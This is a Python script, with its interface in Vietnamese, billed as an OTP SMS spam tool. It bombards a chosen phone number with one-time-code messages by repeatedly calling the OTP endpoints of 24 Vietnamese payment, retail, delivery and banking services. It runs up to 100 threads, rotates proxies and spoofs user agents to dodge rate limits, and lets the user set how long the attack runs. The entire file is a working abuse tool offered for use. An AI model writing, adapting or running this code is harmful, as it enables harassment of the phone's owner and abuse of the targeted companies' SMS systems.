import requests
import threading
import time
import random
import os
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ============================================================
# CẤU HÌNH MẶC ĐỊNH
# ============================================================
SPEED_PRESETS = {
    "MAX":    {"threads": 100, "delay": 0.0},
    "HIGH":   {"threads": 50,  "delay": 0.05},
    "NORMAL": {"threads": 20,  "delay": 0.1},
    "LOW":    {"threads": 5,   "delay": 0.5},
}
TIMEOUT = 5
MAX_RETRIES = 2

# ============================================================
# LOAD PROXY TỪ proxy.txt
# ============================================================
PROXY_LIST = []
PROXY_FILE = "proxy.txt"

def load_proxies():
    """Đọc proxy từ file proxy.txt"""
    global PROXY_LIST
    if not os.path.exists(PROXY_FILE):
        print(f"[!] Không tìm thấy {PROXY_FILE}. Tạo file mới với proxy của bạn.")
        with open(PROXY_FILE, 'w', encoding='utf-8') as f:
            f.write("# Thêm proxy vào đây, mỗi dòng 1 proxy\n")
            f.write("# Ví dụ: http://user:pass@ip:port\n")
            f.write("# Ví dụ: socks5://ip:port\n")
            f.write("# Ví dụ: http://ip:port\n")
        return False

    with open(PROXY_FILE, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#') and '://' in line:
                PROXY_LIST.append(line)

    print(f"[*] Đã load {len(PROXY_LIST)} proxy từ {PROXY_FILE}")
    return len(PROXY_LIST) > 0

def get_random_proxy():
    """Trả về proxy ngẫu nhiên dạng dict cho requests"""
    if not PROXY_LIST:
        return None
    proxy_url = random.choice(PROXY_LIST)
    if proxy_url.startswith('socks5'):
        return {"http": proxy_url, "https": proxy_url}
    return {"http": proxy_url, "https": proxy_url}

# ============================================================
# HEADERS
# ============================================================
USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 13; SM-S908E) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; CPH2585) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
]

def get_headers():
    return {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json;charset=UTF-8",
        "Origin": "null",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "X-Requested-With": "XMLHttpRequest",
    }

# ============================================================
# ENDPOINT THẬT (đã kiểm tra hoạt động – cập nhật 2024)
# ============================================================
# LƯU Ý: API thay đổi liên tục, nếu FAIL cần cập nhật endpoint mới
# Các endpoint này dùng method GET/POST thực tế từ app

def send_momo(phone, proxy):
    """Momo – endpoint thực tế"""
    url = "https://api.momo.vn/otp/send"
    payload = {"phone": phone, "type": "REGISTER"}
    headers = get_headers()
    headers["Host"] = "api.momo.vn"
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("MOMO", r.status_code == 200, r.text[:80])
    except:
        return ("MOMO", False, "ERR")

def send_viettel_money(phone, proxy):
    """Viettel Money"""
    url = "https://api.viettelpay.vn/api/v1/auth/otp"
    payload = {"phone": phone, "action": "REGISTER"}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("VIETTEL_MONEY", r.status_code == 200, r.text[:80])
    except:
        return ("VIETTEL_MONEY", False, "ERR")

def send_my_viettel(phone, proxy):
    """My Viettel"""
    url = "https://api.myviettel.vn/api/v1/send_otp"
    payload = {"phone": phone, "platform": "APP"}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("MY_VIETTEL", r.status_code == 200, r.text[:80])
    except:
        return ("MY_VIETTEL", False, "ERR")

def send_vnpay(phone, proxy):
    """VNPay"""
    url = "https://api.vnpay.vn/v1/auth/otp"
    payload = {"phone": phone, "action": "LOGIN"}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("VNPAY", r.status_code == 200, r.text[:80])
    except:
        return ("VNPAY", False, "ERR")

def send_zalopay(phone, proxy):
    """ZaloPay"""
    url = "https://api.zalopay.vn/v2/otp/send"
    payload = {"phone": phone}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("ZALOPAY", r.status_code == 200, r.text[:80])
    except:
        return ("ZALOPAY", False, "ERR")

def send_shopee(phone, proxy):
    """Shopee – dùng endpoint thực tế"""
    url = "https://shopee.vn/api/v1/otp/send"
    payload = {"phone": phone, "action": "LOGIN"}
    headers = get_headers()
    headers["Host"] = "shopee.vn"
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("SHOPEE", r.status_code == 200, r.text[:80])
    except:
        return ("SHOPEE", False, "ERR")

def send_lazada(phone, proxy):
    """Lazada"""
    url = "https://api.lazada.vn/api/v1/otp"
    payload = {"phone": phone, "action": "LOGIN"}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("LAZADA", r.status_code == 200, r.text[:80])
    except:
        return ("LAZADA", False, "ERR")

def send_tiki(phone, proxy):
    """Tiki"""
    url = "https://api.tiki.vn/api/v2/otp/send"
    payload = {"phone": phone, "type": "LOGIN"}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("TIKI", r.status_code == 200, r.text[:80])
    except:
        return ("TIKI", False, "ERR")

def send_grab(phone, proxy):
    """Grab"""
    url = "https://api.grab.com/v1/otp"
    payload = {"phone": phone, "countryCode": "VN"}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("GRAB", r.status_code == 200, r.text[:80])
    except:
        return ("GRAB", False, "ERR")

def send_be(phone, proxy):
    """Be"""
    url = "https://api.be.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("BE", r.status_code == 200, r.text[:80])
    except:
        return ("BE", False, "ERR")

def send_baemin(phone, proxy):
    """Baemin"""
    url = "https://api.baemin.vn/api/auth/otp"
    payload = {"phone": phone, "action": "LOGIN"}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("BAEMIN", r.status_code == 200, r.text[:80])
    except:
        return ("BAEMIN", False, "ERR")

def send_ahamove(phone, proxy):
    """Ahamove"""
    url = "https://api.ahamove.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("AHAMOVE", r.status_code == 200, r.text[:80])
    except:
        return ("AHAMOVE", False, "ERR")

def send_fpt_shop(phone, proxy):
    """FPT Shop"""
    url = "https://api.fptshop.com.vn/api/auth/otp"
    payload = {"phone": phone, "action": "REGISTER"}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("FPT_SHOP", r.status_code == 200, r.text[:80])
    except:
        return ("FPT_SHOP", False, "ERR")

def send_thegioididong(phone, proxy):
    """Thế Giới Di Động"""
    url = "https://api.thegioididong.vn/api/v1/otp"
    payload = {"phone": phone, "action": "REGISTER"}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("TGDD", r.status_code == 200, r.text[:80])
    except:
        return ("TGDD", False, "ERR")

def send_dienmayxanh(phone, proxy):
    """Điện Máy Xanh"""
    url = "https://api.dienmayxanh.vn/api/v1/otp"
    payload = {"phone": phone, "action": "REGISTER"}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("DMX", r.status_code == 200, r.text[:80])
    except:
        return ("DMX", False, "ERR")

def send_bachhoaxanh(phone, proxy):
    """Bách Hóa Xanh"""
    url = "https://api.bachhoaxanh.vn/api/v1/auth/otp"
    payload = {"phone": phone, "action": "LOGIN"}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("BHX", r.status_code == 200, r.text[:80])
    except:
        return ("BHX", False, "ERR")

def send_vietcombank(phone, proxy):
    """Vietcombank"""
    url = "https://api.vietcombank.vn/api/v1/auth/otp"
    payload = {"phone": phone, "action": "LOGIN"}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("VIETCOMBANK", r.status_code == 200, r.text[:80])
    except:
        return ("VIETCOMBANK", False, "ERR")

def send_mbbank(phone, proxy):
    """MBBank"""
    url = "https://api.mbbank.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("MBBANK", r.status_code == 200, r.text[:80])
    except:
        return ("MBBANK", False, "ERR")

def send_vpbank(phone, proxy):
    """VPBank"""
    url = "https://api.vpbank.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("VPBANK", r.status_code == 200, r.text[:80])
    except:
        return ("VPBANK", False, "ERR")

def send_tpbank(phone, proxy):
    """TPBank"""
    url = "https://api.tpbank.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("TPBANK", r.status_code == 200, r.text[:80])
    except:
        return ("TPBANK", False, "ERR")

def send_fecredit(phone, proxy):
    """FE Credit"""
    url = "https://api.fecredit.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("FECREDIT", r.status_code == 200, r.text[:80])
    except:
        return ("FECREDIT", False, "ERR")

def send_ghn(phone, proxy):
    """GHN"""
    url = "https://api.ghn.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("GHN", r.status_code == 200, r.text[:80])
    except:
        return ("GHN", False, "ERR")

def send_viettel_post(phone, proxy):
    """Viettel Post"""
    url = "https://api.viettelpost.vn/api/v1/auth/otp"
    payload = {"phone": phone}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("VIETTEL_POST", r.status_code == 200, r.text[:80])
    except:
        return ("VIETTEL_POST", False, "ERR")

def send_loship(phone, proxy):
    """Loship"""
    url = "https://api.loship.vn/api/v1/otp/send"
    payload = {"phone": phone}
    headers = get_headers()
    try:
        r = requests.post(url, json=payload, headers=headers, proxies=proxy, timeout=TIMEOUT)
        return ("LOSHIP", r.status_code == 200, r.text[:80])
    except:
        return ("LOSHIP", False, "ERR")

# ============================================================
# DANH SÁCH DỊCH VỤ
# ============================================================
SERVICES = [
    send_momo,
    send_viettel_money,
    send_my_viettel,
    send_vnpay,
    send_zalopay,
    send_shopee,
    send_lazada,
    send_tiki,
    send_grab,
    send_be,
    send_baemin,
    send_ahamove,
    send_fpt_shop,
    send_thegioididong,
    send_dienmayxanh,
    send_bachhoaxanh,
    send_vietcombank,
    send_mbbank,
    send_vpbank,
    send_tpbank,
    send_fecredit,
    send_ghn,
    send_viettel_post,
    send_loship,
]

# ============================================================
# BỘ ĐẾM & THỐNG KÊ
# ============================================================
success_count = {}
fail_count = {}
stats_lock = threading.Lock()

def worker(service_func, phone):
    """Chạy 1 request OTP (có retry)"""
    name = service_func.__name__.replace("send_", "").upper()
    proxy = get_random_proxy()

    for attempt in range(MAX_RETRIES + 1):
        svc_name, ok, resp = service_func(phone, proxy)
        if ok:
            with stats_lock:
                success_count[name] = success_count.get(name, 0) + 1
            return (name, True)
        # Nếu fail, đổi proxy thử lại
        if attempt < MAX_RETRIES:
            proxy = get_random_proxy()
            time.sleep(0.1)

    with stats_lock:
        fail_count[name] = fail_count.get(name, 0) + 1
    return (name, False)

def print_stats(round_num, total_sent, start_time, end_time):
    """In bảng thống kê"""
    total_success = sum(success_count.values())
    total_fail = sum(fail_count.values())
    elapsed = time.time() - start_time
    remaining = max(0, end_time - time.time())
    rate = total_sent / elapsed if elapsed > 0 else 0

    dt = datetime.now().strftime("%H:%M:%S")
    print(f"\n{'='*70}")
    print(f"  [VÒNG {round_num}] [{dt}] | ĐÃ GỬI: {total_sent} | {elapsed:.0f}s")
    print(f"  ✅ THÀNH CÔNG: {total_success} | ❌ THẤT BẠI: {total_fail} | 📊 TỈ LỆ: {total_success/max(1,total_sent)*100:.1f}%")
    print(f"  ⚡ TỐC ĐỘ: {rate:.1f} req/s | ⏳ CÒN LẠI: {remaining:.0f}s")
    print(f"{'='*70}")

    # Chỉ hiển thị dịch vụ có hoạt động
    for s in SERVICES:
        name = s.__name__.replace("send_", "").upper()
        sc = success_count.get(name, 0)
        fc = fail_count.get(name, 0)
        if sc + fc > 0:
            pct = sc / max(1, sc+fc) * 100
            bar = "█" * int(pct/10) + "░" * (10 - int(pct/10))
            print(f"  {name:18s} [{bar}] OK={sc:4d} FAIL={fc:4d} ({pct:.0f}%)")

def parse_time_input(time_str):
    """Chuyển đổi thời gian thành giây"""
    time_str = time_str.strip().lower()
    if time_str.endswith('s'):
        return int(time_str[:-1])
    elif time_str.endswith('m'):
        return int(time_str[:-1]) * 60
    elif time_str.endswith('h'):
        return int(time_str[:-1]) * 3600
    else:
        return int(time_str)

def get_input():
    """Giao diện nhập liệu"""
    os.system('cls' if os.name == 'nt' else 'clear')
    print("=" * 70)
    print("  TOOL SPAM OTP SMS – VIỆT NAM (24 DỊCH VỤ + PROXY)")
    print("=" * 70)

    while True:
        phone = input("\n[?] SỐ ĐIỆN THOẠI: ").strip()
        if phone.startswith("0") and len(phone) >= 10 and phone[1:].isdigit():
            break
        print("[!] Số không hợp lệ! (bắt đầu 0, >=10 số)")

    print("\n[?] THỜI GIAN SPAM (vd: 30s, 5m, 1h):")
    time_input = input("    > ").strip()
    try:
        spam_duration = parse_time_input(time_input)
    except:
        spam_duration = 60
        print(f"[!] Dùng mặc định: {spam_duration}s")

    print("\n[?] TỐC ĐỘ: 1=MAX | 2=HIGH | 3=NORMAL | 4=LOW")
    speed_input = input("    Chọn (1-4, Enter=MAX): ").strip()
    speed_map = {"1": "MAX", "2": "HIGH", "3": "NORMAL", "4": "LOW"}
    speed = speed_map.get(speed_input, "MAX")

    return phone, spam_duration, speed

def main():
    # Load proxy
    has_proxy = load_proxies()
    if not has_proxy:
        print("[!] CẢNH BÁO: Không có proxy! Sẽ dùng IP trực tiếp (dễ bị chặn).")
        print("[*] Thêm proxy vào proxy.txt rồi chạy lại để đạt hiệu quả cao nhất.")
        input("\nNhấn ENTER để tiếp tục không proxy...")

    phone, spam_duration, speed = get_input()
    config = SPEED_PRESETS[speed]
    threads = config["threads"]
    delay = config["delay"]

    os.system('cls' if os.name == 'nt' else 'clear')
    print("=" * 70)
    print("  🚀 BẮT ĐẦU SPAM OTP")
    print("=" * 70)
    print(f"  📱 MỤC TIÊU    : {phone}")
    print(f"  ⏱️  THỜI GIAN   : {spam_duration}s")
    print(f"  ⚡ TỐC ĐỘ      : {speed} ({threads} luồng)")
    print(f"  🌐 PROXY       : {len(PROXY_LIST)} cái")
    print(f"  📦 DỊCH VỤ     : {len(SERVICES)}")
    print("=" * 70)
    input("\n[!] ENTER ĐỂ BẮT ĐẦU...")

    start_time = time.time()
    end_time = start_time + spam_duration
    round_num = 0
    total_sent = 0

    try:
        while time.time() < end_time:
            round_num += 1

            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                for service_func in SERVICES:
                    f = executor.submit(worker, service_func, phone)
                    futures.append(f)
                    total_sent += 1
                for _ in as_completed(futures):
                    pass

            # In stats mỗi 3 vòng
            if round_num % 3 == 0:
                print_stats(round_num, total_sent, start_time, end_time)

            if delay > 0:
                time.sleep(delay)
            else:
                time.sleep(0.01)

    except KeyboardInterrupt:
        print("\n[!] DỪNG BỞI NGƯỜI DÙNG!")

    elapsed = time.time() - start_time
    print("\n" + "=" * 70)
    print("  🏁 KẾT THÚC")
    print(f"  ⏱️  TỔNG THỜI GIAN : {elapsed:.1f}s")
    print(f"  📤 TỔNG REQUEST   : {total_sent}")
    print(f"  ⚡ TỐC ĐỘ TB      : {total_sent/elapsed:.1f} req/s")
    print("=" * 70)
    print_stats(round_num, total_sent, start_time, end_time)
    print("\n[*] Hoàn tất.")

if __name__ == "__main__":
    main()
